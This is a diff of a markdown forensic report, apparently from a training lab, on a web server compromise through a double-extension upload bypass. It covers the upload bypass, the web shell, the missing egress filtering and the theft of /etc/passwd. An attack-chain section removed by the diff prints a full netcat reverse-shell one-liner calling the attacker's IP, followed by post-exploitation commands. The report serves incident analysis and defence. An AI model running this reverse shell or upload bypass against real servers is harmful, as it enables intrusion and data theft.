@@ -1,12 +1,11 @@
 # Web Server Compromise via Unrestricted File Upload
 
-## DataSecure Inc. shoporoma.com Forensic Investigation
+## DataSecure Inc & shoporoma.com Forensic Investigation
 
 
 ## 1. Engagement Overview
 
-A forensic investigation was conducted on a provided PCAP file capturing a
-confirmed web server compromise affecting `shoporoma.com`, a banking portal
+A forensic investigation was conducted on a provided PCAP file capturing a confirmed web server compromise affecting `shoporoma.com`, a banking portal
 hosted by DataSecure Inc. The incident occurred on **30 November 2023, between
 approximately 18:43 and 18:44 UTC**, based on timestamps extracted from captured
 HTTP responses. The attack originated from IP `117.11.88.124` (CN, China) and
@@ -56,30 +55,30 @@ the target server.
 
 ## 4. Methodology
 
-### Phase 1 -- Traffic Overview and IP Identification
+### Phase 1: Traffic Overview and IP Identification
 Wireshark was opened with the provided PCAP. The filter `ip.addr == 117.11.88.124`
 was applied to isolate all traffic involving the attacker's address. Conversation
 statistics were reviewed to confirm the attacker communicated exclusively with the
 target server. `geoiplookup 117.11.88.124` and `whois 117.11.88.124` were run from
 the terminal to retrieve geographic origin and ASN registration data.
 
-### Phase 2 -- HTTP Traffic Analysis
+### Phase 2: HTTP Traffic Analysis
 The filter `http.request.method == "POST"` was applied to isolate upload
 requests. TCP streams were followed for each POST to reconstruct full request
 and response pairs, including headers, form fields, file content, and server
 responses.
 
-### Phase 3 -- Web Shell Extraction and Hashing
+### Phase 3: Web Shell Extraction and Hashing
 NetworkMiner was used to automatically reassemble the uploaded file from the
 PCAP. The extracted `image.jpg.php` was located in the Files tab. MD5, SHA-1,
 and SHA-256 hashes were computed from the extracted artifact for use as IOCs.
 
-### Phase 4 -- Reverse Shell and Post-Exploitation Analysis
+### Phase 4: Reverse Shell and Post-Exploitation Analysis
 The filter `tcp.port == 8080` was applied to isolate the outbound reverse shell
 connection. The TCP stream was followed to reconstruct the interactive shell
 session and identify all commands executed by the attacker after gaining access.
 
-### Phase 5 -- Attack Reconstruction and Documentation
+### Phase 5: Attack Reconstruction and Documentation
 The full attack sequence was reconstructed by correlating packet timestamps,
 HTTP request/response pairs, and TCP stream content. All IOCs were documented
 and recommendations were developed based on the confirmed attack vectors.
@@ -102,13 +101,13 @@ and recommendations were developed based on the confirmed attack vectors.
 
 ---
 
-### Finding 01 -- Unrestricted File Upload via Double Extension Bypass
+### Finding 01: Unrestricted File Upload via Double Extension Bypass
 
 #### Severity
 Critical
 
 #### Affected Endpoint
-`http://shoporoma.com/reviews/upload.php` -- POST, `uploadedFile` field
+`http://shoporoma.com/reviews/upload.php` POST, `uploadedFile` field
 
 #### Description
 The reviews feature on `shoporoma.com` accepts file uploads via a
@@ -123,11 +122,11 @@ actual content or the terminal extension (`.php`).
 
 #### Proof of Concept
 
-First upload attempt rejected -- filename `image.php`:
+First upload attempt rejected: filename `image.php`:
 
 
 
-![Wireshark TCP Stream - First Upload Rejected with Invalid file format](image.jpg)
+![Wireshark TCP Stream - First Upload Rejected with Invalid file format](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_01%20Wireshark%20TCP%20Stream%20-%20First%20Upload%20Rejected%20with%20Invalid%20file%20format.jpg)
 
 
 
@@ -144,12 +143,12 @@ HTTP/1.1 200 OK
 Invalid file format.
 ```
 
-Second upload attempt succeeded -- filename `image.jpg.php` with fake form
+Second upload attempt succeeded, filename `image.jpg.php` with fake form
 fields used to mimic a legitimate review submission:
 
 
 
-![Wireshark TCP Stream - Second Upload Accepted with File uploaded successfully](image.jpg)
+![Wireshark TCP Stream - Second Upload Accepted with File uploaded successfully](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_02%20Wireshark%20TCP%20Stream%20-%20Second%20Upload%20Accepted%20with%20File%20uploaded%20successfully.jpg)
 
 
 
@@ -217,7 +216,7 @@ Options -ExecCGI
 
 ---
 
-### Finding 02 -- Web Shell Remote Code Execution
+### Finding 02: Web Shell Remote Code Execution
 
 #### Severity
 Critical
@@ -236,13 +235,7 @@ interactive shell session running as the `www-data` user.
 
 #### Proof of Concept
 
-Reverse shell payload extracted from the uploaded file via NetworkMiner:
-
-
-
-![NetworkMiner Files Tab - image.jpg.php Extracted with Payload Visible](image.jpg)
-
-
+Reverse shell payload extracted from the uploaded file:
 
 Payload content:
 ```php
@@ -253,8 +246,7 @@ Payload content:
 Outbound TCP connection to port 8080 captured in Wireshark:
 
 
-
-![Wireshark Filter tcp.port == 8080 - Outbound Reverse Shell Connection](image.jpg)
+![Wireshark Filter tcp.port == 8080 - Outbound Reverse Shell Connection](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_03%20Wireshark%20Filter%20tcp.port%20%3D%3D%208080%20-%20Outbound%20Reverse%20Shell%20Connection.jpg)
 
 
 
@@ -295,13 +287,13 @@ the server.
 
 ---
 
-### Finding 03 -- No Egress Network Filtering on Web Server
+### Finding 03: No Egress Network Filtering on Web Server
 
 #### Severity
 Critical
 
 #### Affected Component
-Web server network configuration -- outbound TCP port 8080
+Web server network configuration: outbound TCP port 8080
 
 #### Description
 The web server permitted an unrestricted outbound TCP connection from the
@@ -319,7 +311,7 @@ the attacker on port 8080, establishing the interactive shell session:
 
 
 
-![Wireshark TCP Stream - Server Initiated Outbound Connection to 117.11.88.124:8080](image.jpg)
+![GeoIP lookup](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_05%20GeoIP%20lookup%20confirming%20the%20attacker's%20IP%20location.jpg)
 
 
 
@@ -348,13 +340,13 @@ inbound firewall rules, which most organizations prioritize over egress controls
 
 ---
 
-### Finding 04 -- /etc/passwd Exfiltration via Reverse Shell
+### Finding 04: /etc/passwd Exfiltration via Reverse Shell
 
 #### Severity
 High
 
 #### Affected Component
-Server filesystem -- `/etc/passwd`
+Server filesystem: `/etc/passwd`
 
 #### Description
 After establishing the reverse shell session, the attacker ran a sequence of
@@ -370,7 +362,7 @@ was running as `ubuntu-virtual-machine` with a single local user account
 
 TCP stream reconstructing post-exploitation commands run by the attacker:
 
-![Wireshark TCP Stream - Post-Exploitation Commands Including cat /etc/passwd](image.jpg)
+![Wireshark TCP Stream - Post-Exploitation Commands Including cat /etc/passwd](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_04%20Wireshark%20TCP%20Stream%20-%20Post-Exploitation%20Commands%20Including%20cat%2C%20etc%2C%20and%20passwd.jpg)
 
 
 
@@ -404,13 +396,13 @@ privilege escalation.
 
 ---
 
-### Finding 05 -- Server Version Disclosure via HTTP Response Headers
+### Finding 05: Server Version Disclosure via HTTP Response Headers
 
 #### Severity
 Medium
 
 #### Affected Component
-HTTP response headers -- all responses from `shoporoma.com`
+HTTP response headers: all responses from `shoporoma.com`
 
 #### Description
 Every HTTP response from the server included the `Server` header identifying
@@ -442,49 +434,7 @@ effort. This is passive reconnaissance that costs nothing but reading the respon
 
 ## 7. Attack Chain
 
-```
-[30 Nov 2023, ~18:43 UTC] Reconnaissance
-117.11.88.124 browsed shoporoma.com
-Accessed product page, about page, reviews page
-Identified /reviews/ as an attack surface with file upload capability
-        |
-        v
-[18:43 UTC] First Upload Attempt - FAILED
-POST /reviews/upload.php
-Filename: image.php
-Content-Type: application/x-php
-Server response: "Invalid file format."
-Extension-only check blocks .php extension
-        |
-        v
-[18:44 UTC] Second Upload Attempt - SUCCEEDED
-POST /reviews/upload.php
-Filename: image.jpg.php (double extension bypass)
-Fake form fields: name="asd", email="asd@asd.com", review="asd"
-Content-Type: application/x-php
-Server response: "File uploaded successfully"
-File stored at: /var/www/html/reviews/uploads/image.jpg.php
-        |
-        v
-[18:44 UTC] Web Shell Triggered
-HTTP GET to http://shoporoma.com/reviews/image.jpg.php
-PHP payload executes: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc
-117.11.88.124 8080 >/tmp/f
-Server initiates outbound TCP connection to 117.11.88.124:8080
-        |
-        v
-[18:44 UTC] Interactive Shell Established
-www-data shell session active
-whoami: www-data
-uname -a: Linux ubuntu-virtual-machine 6.2.0-37-generic
-pwd: /var/www/html/reviews/uploads
-        |
-        v
-[18:44 UTC] Data Exfiltration
-ls /home -> ubuntu
-cat /etc/passwd -> user account list exfiltrated
-```
-
+![Attack Chain](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/05_06%20Attack%20Chain.jpg)
 ---
 
 ## 8. Tools Used
